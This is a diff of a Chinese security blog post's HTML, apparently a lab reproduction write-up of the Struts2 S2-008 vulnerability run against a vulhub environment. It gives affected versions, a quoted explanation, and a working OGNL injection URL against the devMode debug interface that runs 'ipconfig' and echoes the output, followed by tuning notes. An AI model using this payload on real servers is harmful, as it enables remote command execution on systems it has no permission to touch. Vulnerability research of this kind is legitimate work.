@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html S2-00">
+    <meta name="description" content="【研究】Struts2漏洞之S2-008漏洞环境和可用POC 1.环境 2.原理 3.影响版本 4.利用过程 POC 有效POC’’ POC注意  1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理1参考 http:&#x2F;&#x2F;rickgray">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC">
 <meta property="og:url" content="https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html S2-00">
+<meta property="og:description" content="【研究】Struts2漏洞之S2-008漏洞环境和可用POC 1.环境 2.原理 3.影响版本 4.利用过程 POC 有效POC’’ POC注意  1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理1参考 http:&#x2F;&#x2F;rickgray">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190701164539250.png">
@@ -23,9 +23,10 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2019-07-01T09:08:11.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.556Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:08.193Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -64,6 +65,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -126,7 +129,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number">6.</span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number">7.</span> <span class="toc-text">POC注意</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#【研究】Struts2漏洞之S2-008漏洞环境和可用POC"><span class="toc-number">1.</span> <span class="toc-text">【研究】Struts2漏洞之S2-008漏洞环境和可用POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number"></span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number"></span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number"></span> <span class="toc-text">POC注意</span></a>
     </div>
   </span>
 </div>
@@ -159,7 +162,7 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
@@ -173,9 +176,20 @@
     <a id="more"></a>
 
 
-<p>@<a href="【研究】Struts2漏洞之S2-008漏洞环境和可用POC">TOC</a></p>
+
+<h3 id="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"><a href="#【研究】Struts2漏洞之S2-008漏洞环境和可用POC" class="headerlink" title="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"></a>【研究】Struts2漏洞之S2-008漏洞环境和可用POC</h3><ul>
+<li><a href="#1_3">1.环境</a></li>
+<li><a href="#2_8">2.原理</a></li>
+<li><a href="#3_20">3.影响版本</a></li>
+<li><a href="#4_23">4.利用过程</a></li>
+<li><a href="#POC_27">POC</a></li>
+<li><a href="#POC_43">有效POC’’</a></li>
+<li><a href="#POC_51">POC注意</a></li>
+</ul>
 <h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p>
-<h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><pre><code>参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</code></pre><blockquote>
+<h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html</span><br></pre></td></tr></table></figure>
+
+<blockquote>
 <p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
 </blockquote>
 <h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p>
@@ -186,6 +200,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20190701164539250.png" alt="在这里插入图片描述"><br>一样弹出回显<img src="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="下载"><br><img src="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道什么编码，没东西好想</p>
 <p>**</p>
 <h2 id="有效POC’’"><a href="#有效POC’’" class="headerlink" title="有效POC’’"></a>有效POC’’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.128:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[501],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span></span><br></pre></td></tr></table></figure>
+
 <p>这个是网上找的结合007构造的POC<br>可以直接回显<br><img src="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这个poc也是得自己去调整，不是完全试用的<br>简单阅读和实验之后发现POC，发现res存在大小上限<br>测试发现，res更改的数值可以控制回显的字数多少</p>
 <p>我这个大于700之后就是null了<br><img src="https://img-blog.csdnimg.cn/20190701170137420.png" alt="在这里插入图片描述"><br>但是从小的开始10慢慢增加会显示的数量<br><img src="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>500的时候差不多都显示了，所以这个得自己千调整试试</p>
@@ -219,7 +234,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number">6.</span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number">7.</span> <span class="toc-text">POC注意</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#【研究】Struts2漏洞之S2-008漏洞环境和可用POC"><span class="toc-number">1.</span> <span class="toc-text">【研究】Struts2漏洞之S2-008漏洞环境和可用POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number"></span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number"></span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number"></span> <span class="toc-text">POC注意</span></a>
     </div>
 
     <div id="share-footer" style="display: none">
